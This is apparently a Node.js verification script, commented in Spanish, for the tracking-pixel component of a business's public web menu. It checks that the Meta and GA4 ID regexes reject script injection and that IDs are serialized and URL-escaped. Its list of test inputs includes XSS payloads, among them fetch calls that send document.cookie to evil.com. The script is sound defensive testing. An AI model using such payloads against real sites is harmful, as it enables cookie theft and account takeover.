// LOS PIXELES DE LA CARTA WEB (2026-08-27).
//
// El panel no tiene runner de tests y esto decide que se ejecuta en la pagina
// que ven TODOS los clientes del negocio. Corre con
// `node scripts/verificar-pixeles.mjs`.
//
// Los regex son copia de components/PixelesCarta.tsx. Si cambian alla,
// actualiza esta copia y vuelve a correrlo.
//
// Verificado por mutacion: aflojar cualquiera de los dos deja pasar un
// <script> y rompe tests distintos.

const META = /^\d{10,20}$/;
const GA4 = /^G-[A-Z0-9]{4,15}$/i;

let fallos = 0;
const ok = (c, m) => { if (!c) { console.log("  x", m); fallos++; } else console.log("  ok", m); };

console.log("\nCARGA SOLO CON UN ID VALIDO");
ok(META.test("1234567890123"), "un pixel de Meta real carga");
ok(GA4.test("G-ABC1234"), "un GA4 real carga");
ok(!META.test(""), "vacio NO carga: quien no pauta no paga scripts de terceros");
ok(!GA4.test(""), "GA4 vacio tampoco");

console.log("\nNUNCA UN SCRIPT");
// Este valor termina DENTRO de una etiqueta <script> en la carta publica.
for (const veneno of [
  "<script>alert(1)</script>",
  "1234567890123<script>",
  "');fetch('https://evil.com/'+document.cookie);('",
  "javascript:alert(1)",
  "1234567890123'});fetch('https://evil.com');({'",
]) {
  ok(!META.test(veneno), `Meta rechaza: ${veneno.slice(0, 34)}`);
  ok(!GA4.test(veneno), `GA4 rechaza:  ${veneno.slice(0, 34)}`);
}

console.log("\nEL ID SE SERIALIZA, NO SE CONCATENA");
// Asi se arma en el componente: JSON.stringify cierra la cadena aunque el id
// traiga comillas. Es la segunda defensa despues del regex.
const armado = `fbq('init',${JSON.stringify("1234567890123")});`;
ok(armado === "fbq('init',\"1234567890123\");", "el id va serializado dentro del snippet");

console.log("\nGA4 EN LA URL VA ESCAPADO");
ok(
  encodeURIComponent("G-ABC1234&x=1") === "G-ABC1234%26x%3D1",
  "un & en el id no puede agregar parametros a la URL de gtag",
);

console.log(fallos === 0 ? "\nTODO OK\n" : `\n${fallos} FALLOS\n`);
process.exit(fallos ? 1 : 0);
